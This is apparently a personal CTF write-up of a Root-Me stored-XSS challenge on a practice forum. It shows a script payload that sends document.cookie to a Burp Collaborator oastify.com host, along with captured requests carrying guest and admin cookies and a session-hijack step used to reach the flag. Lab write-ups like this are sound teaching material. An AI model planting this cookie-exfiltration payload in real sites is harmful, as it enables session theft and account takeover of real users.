# Root-Me: Stored XSS 1 (Forum v0.001)

**Category:** Web: Client
**Difficulty:** Easy
**Vulnerability type:** Stored Cross-Site Scripting (XSS)

## Challenge Description

The challenge presents a simple forum application (v0.001) with two input fields: `Title` and `Message`, and a "Posted messages" section that renders submitted content back to every visitor of the page. Unlike reflected XSS, the payload here persists server-side and is displayed to anyone who loads the page, including an automated admin bot that periodically reviews posts. This makes it a textbook Stored XSS scenario, with the added twist of needing to trigger an actual admin visit to capture a privileged session rather than just proving self-XSS.

## Recon

The first step was identifying *where* and *how* user input was reflected in the page's HTML.

Submitting a simple marker string into the Message field and inspecting the rendered output showed it landed as a raw text node between existing tags:

```html
<b>input</b>
```

This is a key distinction from attribute-context injection. There was no need to break out of a quoted attribute (`" onmouseover="..."`): any new HTML tag could be injected directly into the body of the message.

## Initial Exploitation Attempt

The first payload tried was the classic:

```html
<script>alert(1)</script>
```

This initially appeared to fail. This is a known browser quirk: when content is inserted into the DOM via `innerHTML` on the client side, `<script>` tags inside that string are inert: the browser will not execute them, by design (to prevent exactly this kind of injection from firing on every dynamic content update).

**However**, this application renders posted messages **server-side**: the message is stored, and on a fresh page load the server outputs it directly into the initial HTML document. Script tags present in server-rendered HTML *do* execute normally, since the browser parses them as part of the original page load rather than as a DOM mutation.

Reloading the page after submitting the payload confirmed execution via:

```html
<script>alert(document.cookie)</script>
```

The alert fired, confirming the injection point was exploitable and would execute for any visitor loading the page.

## Exfiltration Setup

`alert()` only demonstrates the vulnerability to the tester's own browser: it doesn't help capture another user's session. To weaponize the payload, it needed to send the victim's cookie to an external listener.

I used **Burp Suite's Collaborator** as an out-of-band (OOB) listener and upgraded the payload to redirect the victim's browser to the Collaborator endpoint with their cookie appended as a query parameter:

```html
<script>document.location='http://tfch8yxrf50yhugeu9kqgqjer5xwln9c.oastify.com?c='+document.cookie</script>
```

Submitting this as the stored message and reloading the page (simulating my own "visit") produced a hit on the Collaborator listener:

```
GET /?c=session=<redacted_guest_jwt> HTTP/1.1
Host: tfch8yxrf50yhugeu9kqgqjer5xwln9c.oastify.com
```

Decoding the captured JWT (base64) confirmed the payload `"user":"guest"`: i.e., this was **my own session**, not the admin's. This confirmed the exfiltration mechanism worked end-to-end, but the real goal: capturing the admin bot's session: hadn't been reached yet.

## Identifying the Admin Trigger

The page displayed a `Status: visitor` indicator, which changed based on session state. Rather than guessing at how to trigger the admin bot, I inspected the underlying request/cookie logic driving that status indicator directly in Burp.

This revealed the server-side condition controlling when the "admin" role/bot is associated with a session, which in turn showed how to get the admin bot to actually browse to the page containing the stored payload (as opposed to only my own browser reloading it).

Once the stored payload was in place and the trigger condition was satisfied, the admin bot loaded the forum page, executed the stored `<script>` payload in its own session context, and sent its cookie to the Collaborator listener:

```
GET /?c=ADMIN_COOKIE=<redacted> HTTP/1.1
Host: tfch8yxrf50yhugeu9kqgqjer5xwln9c.oastify.com
```

This request arrived independently of any action on my end, confirming it was genuinely the admin bot's session and not a self-triggered duplicate.

## Capturing the Flag

Swapping the exfiltrated admin cookie into the browser session (via Burp/DevTools) elevated the session from `visitor` to `admin`, exposing the flag.

## Key Takeaways

- **Injection context matters**: confirming text-node vs. attribute-context injection determines whether quote-breaking is needed before a payload will even parse as HTML.
- **`innerHTML` vs. server-side rendering**: `<script>` tags injected via client-side DOM manipulation (`innerHTML`) are inert by browser design; the same payload executes normally when rendered as part of the initial server-side HTML response. Knowing which rendering path an app uses changes which payloads are viable.
- **Self-XSS ≠ victim-XSS**: successfully exfiltrating *a* cookie doesn't mean you've compromised the intended target. Always verify *whose* session was captured: decoding a JWT or comparing session identifiers is a fast way to confirm this.
- **Read the app's own logic before guessing**: the `Status: visitor` indicator was a direct clue to how the server tracked session roles. Inspecting the raw request/response logic around it revealed the actual trigger condition for the admin bot, rather than relying on trial and error.

## Tools Used

- Burp Suite (Proxy, Repeater, Collaborator)
- Browser DevTools (cookie/session inspection)
- Base64 decoding (JWT inspection)

---
*Part of my Root-Me CTF writeup series: [see more writeups](../).*
